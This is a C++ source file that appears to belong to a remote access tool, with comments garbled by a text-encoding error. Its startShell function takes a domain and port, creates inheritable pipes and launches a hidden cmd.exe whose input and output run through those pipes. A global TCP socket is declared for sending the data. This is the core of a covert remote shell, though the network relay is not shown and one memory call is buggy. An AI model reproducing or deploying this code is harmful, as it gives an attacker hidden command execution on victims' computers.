#include "pch.h"
#include "Shell.h"

static Shell gShell; // ��ʼ����
static TcpSocket gSock; // �������ݵ��׽���
// �ĸ�HANDLE �������������ܵ�
static HANDLE ghReadPipe1, ghWritePipe1, ghReadPipe2, ghWritePipe2;
// ���������н���֮���õ���pi ���ƽ���
static PROCESS_INFORMATION gPi = { 0 };

Shell::~Shell() {

}

void Shell::startShell(std::string domain, int port) {
	// ���������ܵ�
	SECURITY_ATTRIBUTES securityAttributes = { 0 };
	securityAttributes.bInheritHandle = TRUE;
	securityAttributes.nLength = sizeof(securityAttributes);
	securityAttributes.lpSecurityDescriptor = NULL;
	if ((!::CreatePipe(&ghReadPipe1, &ghWritePipe1, &securityAttributes, 0)) |
		(!::CreatePipe(&ghReadPipe2, &ghWritePipe2, &securityAttributes, 0))) {
		OutputDebugStringA("create pipe failde\r\n");
		return;
	}

	RtlZeroMemory(gPi, sizeof(PROCESS_INFORMATION));
	// ����cmd����
	STARTUPINFOA si = { 0 };
	// ���ش���
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	// ��׼��������ʹ����������ܵ�
	si.hStdInput = ghReadPipe2;
	si.hStdOutput = si.hStdError = ghWritePipe1;
	// ƴ�����������е�����
	CHAR szCmdLine[256] = { 0 };
	GetSystemDirectoryA(szCmdLine, sizeof(szCmdLine));
	StringCchCatA(szCmdLine, _countof(szCmdLine), "\\cmd.exe");
	if (CreateProcessA(szCmdLine, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &gPi) == 0)
	{
		OutputDebugStringA("create cmd process failed\r\n");
		return;
	}
}
